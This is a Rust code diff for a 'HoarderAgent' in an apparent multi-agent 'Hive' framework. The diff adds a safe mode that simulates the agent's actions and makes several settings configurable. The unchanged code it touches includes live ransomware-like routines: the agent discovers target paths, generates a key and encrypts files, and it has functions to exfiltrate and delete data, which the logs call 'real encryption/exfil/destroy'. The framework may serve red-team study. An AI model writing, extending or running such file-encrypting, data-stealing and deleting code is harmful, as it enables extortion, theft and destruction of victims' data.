@@ -20,6 +20,8 @@ struct HoarderAgent {
     heartbeat_interval: Duration,
     target_paths: Vec<PathBuf>,
     encryption_key: Option<Vec<u8>>,
+    safe_mode: bool,
+    throttle_ms: u64,
 }
 
 impl HoarderAgent {
@@ -29,16 +31,24 @@ impl HoarderAgent {
             .await
             .expect("Failed to connect to colmena arena");
 
-        info!("Honeybee connected to shared-memory arena");
+        let cfg = hive_base::config::HiveConfig::load();
+        let safe_mode = cfg.exploits.safe_mode;
+        if safe_mode {
+            info!("Honeybee: SAFE MODE active — actions will be simulated");
+        } else {
+            info!("Honeybee: LIVE mode — real encryption/exfil/destroy enabled");
+        }
 
         Self {
             comms, identity,
-            consensus: ConsensusEngine::new(0.80),
+            consensus: ConsensusEngine::new(cfg.consensus.hoarder_threshold),
             state: HoarderState::Idle,
             active_proposals: Vec::new(),
-            heartbeat_interval: Duration::from_secs(10),
+            heartbeat_interval: Duration::from_secs(cfg.timing.heartbeat_interval_secs),
             target_paths: Self::discover_targets(),
             encryption_key: None,
+            safe_mode,
+            throttle_ms: 100,
         }
     }
 
@@ -124,6 +134,13 @@ impl HoarderAgent {
     // ── Real action execution ────────────────────────────────────────────
 
     async fn execute_encrypt(&mut self) {
+        if self.safe_mode {
+            info!("Honeybee: SAFE MODE — encrypt simulated ({} paths)", self.target_paths.len());
+            let msg = Message::belief(self.identity.id(), Role::Honeybee,
+                "encrypt_result".into(), hive_base::Value::String("simulated (safe_mode)".into()), 1.0);
+            self.publish_msg(msg).await;
+            return;
+        }
         if self.encryption_key.is_none() {
             let key: [u8; 32] = rand::thread_rng().gen();
             self.encryption_key = Some(key.to_vec());
@@ -142,6 +159,7 @@ impl HoarderAgent {
                     Ok(bytes) => {
                         info!("Encrypted: {} ({} bytes)", path.display(), bytes);
                         encrypted += bytes;
+                        tokio::time::sleep(Duration::from_millis(self.throttle_ms)).await;
                     }
                     Err(e) => {
                         warn!("Encrypt failed for {}: {}", path.display(), e);
@@ -179,6 +197,10 @@ impl HoarderAgent {
     }
 
     async fn execute_exfiltrate(&self) {
+        if self.safe_mode {
+            info!("Honeybee: SAFE MODE — exfil simulated");
+            return;
+        }
         let mut total_bytes = 0u64;
 
         for path in &self.target_paths {
@@ -231,6 +253,10 @@ impl HoarderAgent {
     }
 
     async fn execute_destroy(&mut self) {
+        if self.safe_mode {
+            info!("Honeybee: SAFE MODE — destroy simulated ({} paths)", self.target_paths.len());
+            return;
+        }
         let mut deleted = 0u64;
         let mut failed = 0u64;
 
@@ -336,7 +362,7 @@ impl HoarderAgent {
 #[tokio::main]
 async fn main() {
     hive_base::utils::init_logging("honeybee");
-    info!("Initializing Hive Honeybee (REAL mode)...");
+    info!("Initializing Hive Honeybee...");
     let mut hoarder = HoarderAgent::new().await;
     hoarder.run().await;
 }
